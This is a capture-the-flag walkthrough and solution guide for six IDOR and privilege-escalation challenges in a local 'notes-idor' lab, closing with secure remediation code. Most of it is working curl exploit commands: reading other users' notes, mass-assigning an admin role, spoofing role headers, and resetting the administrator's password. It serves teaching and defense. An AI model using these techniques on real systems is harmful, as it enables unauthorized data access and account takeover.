# VulnLab CTF - Notes IDOR Walkthrough & Solution Guide

This document provides step-by-step guidance, progressive hints, proof-of-concept `curl` commands, and remediation strategies for all 6 challenges in `notes-idor`.

---

## 1. Notes - IDOR Note Access (Easy) (`notes-idor-view-easy`)

### Hints
1. Log into the platform as a normal user (`alice` / `alice123`).
2. Inspect the note list via `GET /api/notes`. Observe how notes are identified by sequential integer IDs.
3. The platform administrator was the first user to create a private memo (ID 1). What happens if you request note 1 directly?

### Exploitation Steps
<details>
<summary>Solution</summary>

1. **Authenticate as Alice**:
   ```bash
   curl -s -c cookies.txt -X POST http://127.0.0.1:8002/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username": "alice", "password": "alice123"}'
   ```

2. **Access Admin's Private Note (ID 1)**:
   ```bash
   curl -s -b cookies.txt http://127.0.0.1:8002/api/notes/1
   ```

3. **Result**: The endpoint returns note 1 without verifying that the requesting user owns the note, revealing `FLAG_NOTES_IDOR_VIEW_EASY`.
</details>

---

## 2. Notes - IDOR Note Access (Medium) (`notes-idor-view-medium`)

### Hints
1. Switch to Medium difficulty via `POST /api/difficulty` with `{"difficulty": "medium"}`.
2. View your notes at `GET /api/notes`. Notice that note IDs are no longer plain integers; they appear to be Base64-encoded strings (e.g. `Mw==` for 3).
3. Try encoding target integer `1` into Base64 (`MQ==`), or check if query parameters like `?note_id=1` override the route parameter.

### Exploitation Steps
<details>
<summary>Solution</summary>

1. **Set Active Difficulty to Medium**:
   ```bash
   curl -s -b cookies.txt -c cookies.txt -X POST http://127.0.0.1:8002/api/difficulty \
     -H "Content-Type: application/json" \
     -d '{"difficulty": "medium"}'
   ```

2. **Method A: Base64 Obfuscation Bypass**:
   Encode integer `1` to Base64:
   ```bash
   echo -n "1" | base64
   # Output: MQ==
   ```
   Request the note with the Base64 identifier:
   ```bash
   curl -s -b cookies.txt http://127.0.0.1:8002/api/notes/MQ==
   ```

3. **Method B: Query Parameter Override**:
   ```bash
   curl -s -b cookies.txt "http://127.0.0.1:8002/api/notes/3?note_id=1"
   ```

4. **Result**: Both methods resolve to Note 1 and return `FLAG_NOTES_IDOR_VIEW_MEDIUM`.
</details>

---

## 3. Notes - IDOR Note Access (Hard) (`notes-idor-view-hard`)

### Hints
1. In Hard mode, note IDs are 128-bit UUIDs, preventing sequential enumeration or brute-force guessing.
2. Look for information disclosure across public endpoints or platform activity streams.
3. Check the recent activity feed at `GET /api/activity` or the administrator's public profile at `GET /api/users/admin/public-profile`.

### Exploitation Steps
<details>
<summary>Solution</summary>

1. **Set Active Difficulty to Hard**:
   ```bash
   curl -s -b cookies.txt -c cookies.txt -X POST http://127.0.0.1:8002/api/difficulty \
     -H "Content-Type: application/json" \
     -d '{"difficulty": "hard"}'
   ```

2. **Discover Leaked Note UUID via Activity Log or Public Profile**:
   ```bash
   curl -s http://127.0.0.1:8002/api/activity
   # Look for the NOTE_CREATED entry by user "admin", revealing note_uuid: a1b2c3d4-e5f6-4789-9abc-def012345678
   ```
   Alternatively, inspect the admin public profile:
   ```bash
   curl -s http://127.0.0.1:8002/api/users/admin/public-profile
   ```

3. **Fetch Note Using the Disclosed UUID**:
   ```bash
   curl -s -b cookies.txt http://127.0.0.1:8002/api/notes/a1b2c3d4-e5f6-4789-9abc-def012345678
   ```

4. **Result**: The server returns the confidential memo containing `FLAG_NOTES_IDOR_VIEW_HARD`.
</details>

---

## 4. Notes - Privilege Escalation to Admin (Easy) (`notes-idor-admin-easy`)

### Hints
1. In Easy mode, inspect the user profile update endpoint at `PUT /api/users/profile`.
2. Notice that the server blindly updates user properties based on the incoming JSON payload without filtering sensitive fields.
3. Send `{"role": "admin"}` in the profile update body, then access the administrative flag at `/api/admin/flag`.

### Exploitation Steps
<details>
<summary>Solution</summary>

1. **Authenticate as a Standard User (Alice)**:
   ```bash
   curl -s -c cookies.txt -X POST http://127.0.0.1:8002/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username": "alice", "password": "alice123"}'
   ```

2. **Verify Non-Admin Access is Denied**:
   ```bash
   curl -s -b cookies.txt http://127.0.0.1:8002/api/admin/flag
   # Response: 403 Forbidden
   ```

3. **Exploit Mass Assignment via Profile Update**:
   ```bash
   curl -s -b cookies.txt -c cookies.txt -X PUT http://127.0.0.1:8002/api/users/profile \
     -H "Content-Type: application/json" \
     -d '{"role": "admin"}'
   ```

4. **Access the Admin Flag**:
   ```bash
   curl -s -b cookies.txt http://127.0.0.1:8002/api/admin/flag
   ```

5. **Result**: The endpoint grants administrator access and returns `FLAG_NOTES_IDOR_ADMIN_EASY`.
</details>

---

## 5. Notes - Privilege Escalation to Admin (Medium) (`notes-idor-admin-medium`)

### Hints
1. Switch to Medium difficulty. Mass assignment on `PUT /api/users/profile` is now filtered.
2. How does the administrative authorization middleware determine user permissions? Check if it trusts request headers.
3. Test reverse-proxy headers like `X-Role: admin` or HTTP method override headers like `X-HTTP-Method-Override: ADMIN`.

### Exploitation Steps
<details>
<summary>Solution</summary>

1. **Set Active Difficulty to Medium**:
   ```bash
   curl -s -b cookies.txt -c cookies.txt -X POST http://127.0.0.1:8002/api/difficulty \
     -H "Content-Type: application/json" \
     -d '{"difficulty": "medium"}'
   ```

2. **Method A: Header Spoofing (`X-Role: admin`)**:
   ```bash
   curl -s -b cookies.txt -H "X-Role: admin" http://127.0.0.1:8002/api/admin/flag
   ```

3. **Method B: HTTP Method Override Spoofing**:
   ```bash
   curl -s -b cookies.txt -H "X-HTTP-Method-Override: ADMIN" http://127.0.0.1:8002/api/admin/flag
   ```

4. **Result**: The authorization check trusts the spoofed header and returns `FLAG_NOTES_IDOR_ADMIN_MEDIUM`.
</details>

---

## 6. Notes - Privilege Escalation to Admin (Hard) (`notes-idor-admin-hard`)

### Hints
1. In Hard mode, header spoofing is ignored and direct `role` updates in `/api/users/profile` are stripped.
2. Investigate the user update endpoint `PUT /api/users/:id`. Does it verify that the requesting user owns the targeted account?
3. What happens if you update user ID 1 directly (`PUT /api/users/1`) to reset the administrator password, or pass nested parameters like `{"metadata": {"role": "admin"}}`?

### Exploitation Steps
<details>
<summary>Solution</summary>

1. **Set Active Difficulty to Hard**:
   ```bash
   curl -s -b cookies.txt -c cookies.txt -X POST http://127.0.0.1:8002/api/difficulty \
     -H "Content-Type: application/json" \
     -d '{"difficulty": "hard"}'
   ```

2. **Vector A: Nested Metadata Parameter Injection**:
   ```bash
   curl -s -b cookies.txt -c cookies.txt -X PUT http://127.0.0.1:8002/api/users/profile \
     -H "Content-Type: application/json" \
     -d '{"metadata": {"role": "admin"}}'
   ```
   Retrieve the flag:
   ```bash
   curl -s -b cookies.txt http://127.0.0.1:8002/api/admin/flag
   ```

3. **Vector B: IDOR Password Reset on Administrator Account (User ID 1)**:
   ```bash
   curl -s -b cookies.txt -X PUT http://127.0.0.1:8002/api/users/1 \
     -H "Content-Type: application/json" \
     -d '{"password": "HackedPassword2026!"}'
   ```
   Log in as `admin`:
   ```bash
   curl -s -c admin_cookies.txt -X POST http://127.0.0.1:8002/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "HackedPassword2026!"}'
   ```
   Retrieve the flag:
   ```bash
   curl -s -b admin_cookies.txt http://127.0.0.1:8002/api/admin/flag
   ```

4. **Result**: Both vectors successfully yield `FLAG_NOTES_IDOR_ADMIN_HARD`.
</details>

---

## 7. How to Fix (Remediation)

### 1. Fixing IDOR in Note Access (`GET /api/notes/:id`)
**Root Cause**: The application queries records by identifier without checking whether the requesting user owns the object or has authorized permission to view it.

**Secure Pattern**: Always enforce ownership checks in the database query or application layer:
```javascript
// SECURE: Enforce user ownership in query
const note = await db.query(
    'SELECT * FROM notes WHERE id = $1 AND (user_id = $2 OR is_private = FALSE)',
    [noteId, req.session.user.id]
);

if (!note.rows.length) {
    return res.status(404).json({ error: 'Note not found' });
}
```

### 2. Fixing Mass Assignment in Profile Updates (`PUT /api/users/profile`)
**Root Cause**: Permitting arbitrary object properties from untrusted request bodies into sensitive database columns.

**Secure Pattern**: Explicitly whitelist permitted fields:
```javascript
// SECURE: Whitelist only permitted profile fields
const { full_name, email } = req.body;
const updates = {};
if (typeof full_name === 'string') updates.full_name = full_name;
if (typeof email === 'string') updates.email = email;

// Sensitive attributes like 'role' MUST never be assignable by clients
await db.updateUser(req.session.user.id, updates);
```

### 3. Fixing Header Spoofing in Admin Authorization Middleware
**Root Cause**: Relying on unverified client headers (`X-Role`, `X-HTTP-Method-Override`) to determine security context.

**Secure Pattern**: Determine roles strictly from the authenticated, server-side session:
```javascript
// SECURE: Validate role strictly against verified database session
function requireAdmin(req, res, next) {
    if (!req.session || !req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Forbidden' });
    }
    next();
}
```

### 4. Fixing IDOR on User Update Endpoints (`PUT /api/users/:id`)
**Root Cause**: Allowing any authenticated user to pass arbitrary user IDs in URL parameters without validating authorization.

**Secure Pattern**: Validate that the target matches the authenticated user ID or enforce administrator privileges:
```javascript
// SECURE: Validate that user can only edit their own profile
const targetId = parseInt(req.params.id, 10);
if (req.session.user.id !== targetId && req.session.user.role !== 'admin') {
    return res.status(403).json({ error: 'Unauthorized to modify other users' });
}
```
